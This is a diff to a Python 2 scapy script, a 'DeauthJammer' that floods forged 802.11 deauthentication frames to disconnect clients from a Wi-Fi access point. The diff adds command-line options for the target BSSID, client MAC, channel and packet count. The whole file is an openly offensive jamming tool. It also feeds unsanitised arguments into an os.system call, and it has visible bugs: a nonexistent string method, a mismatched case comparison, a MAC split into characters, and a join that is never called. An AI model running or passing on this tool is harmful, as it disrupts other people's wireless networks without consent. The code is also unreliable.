@@ -5,38 +5,42 @@
 
 import threading
 import atexit
+import argparse
+import types
+import os
 import scapy.all as scapy
 
 
 class DeauthJammer(object):
 
-    def __init__(self, ap_bssid, ap_ssid=None):
-        self._ap_ssid = ap_ssid
+    def __init__(self, ap_bssid, iface="wlan0mon"):
         self._ap_bssid = ap_bssid
         self._threads = []
+        # scapy.conf.iface =
         atexit.register(self._on_end)
+        scapy.conf.iface = iface
         scapy.conf.verb = 0  # Non-verbose mode
 
-    def jam(self, bssid, packet_count=1, targets=None):
-        if not targets:
-            return
+    def jam(self, targets, packet_count=1):
+        if type(targets) is types.StringType:
+            targets = list(targets)
 
-        # scapy.conf.iface = SET INTERFACE
+        assert type(targets) is types.ListType
 
         for target in targets:
-            jamThread = threading.Thread(target=self._deauth_target, args=(
-                bssid, target, packet_count), kwargs={})
+            jamThread = threading.Thread(
+                target=self._deauth_target, args=(target, packet_count), kwargs={})
             self._threads.append(jamThread)
             jamThread.start()
 
-    def _deauth_target(self, bssid, target, packet_count):
+    def _deauth_target(self, target, packet_count):
         broadcast = target.lowercase() != 'FF:FF:FF:FF:FF:FF'
-        ap_to_client_pckt = scapy.Dot11(addr1=target, addr2=bssid,
-                             addr3=bssid) / scapy.Dot11Deauth()
+        ap_to_client_pckt = scapy.Dot11(addr1=target, addr2=self._ap_bssid,
+                                        addr3=self._ap_bssid) / scapy.Dot11Deauth()
         client_to_ap_pckt = None
         if not broadcast:
             client_to_ap_pckt = scapy.Dot11(
-                addr1=bssid, addr2=client, addr3=bssid) / scapy.Dot11Deauth()
+                addr1=self._ap_bssid, addr2=target, addr3=self._ap_bssid) / scapy.Dot11Deauth()
 
         for n in range(packet_count):
             scapy.send(ap_to_client_pckt)
@@ -50,6 +54,25 @@ class DeauthJammer(object):
         for thread in self._threads:
             thread.join
 
-# TODO Make sure we are on the right channel for this network
-jammer = DeauthJammer("00:80:41:ae:fd:7e")
-jammer.jam("SOME BSSID", packet_count=3, targets=["1", "2"])
+if __name__ == '__main__':
+    arg_parser = argparse.ArgumentParser()
+    arg_parser.add_argument("-a, --bssid", dest="bssid",
+                            help="BSSID of ap that inadvertently closes the connection", metavar="BSSID")
+    arg_parser.add_argument("-t, --client_mac", dest="client_mac",
+                            help="Target of deauthentification", metavar="CLIENT_MAC")
+    arg_parser.add_argument("-c, --channel", dest="channel",
+                            help="Channel on which the network operates", metavar="CHANNEL")
+    arg_parser.add_argument("-n", dest="count", default="64",
+                            help="Amount of deauth-packages to be sent", metavar="COUNT")
+    arg_parser.add_argument("-i, --iface", dest="iface", default="wlan0mon",
+                            help="Interface to use for sending deauth-packages", metavar="IFACE")
+
+    parsed_options = arg_parser.parse_args()
+    parsed_options.count = int(parsed_options.count)
+
+    os.system("iwconfig %s channel %d" %
+              (parsed_options.iface, parsed_options.channel))
+    print "Switched to channel %d on interface %s" % (parsed_options.channel, parsed_options.iface)
+
+    jammer = DeauthJammer(parsed_options.bssid, iface=parsed_options.iface)
+    jammer.jam(parsed_options.client_mac, packet_count=parsed_options.count)
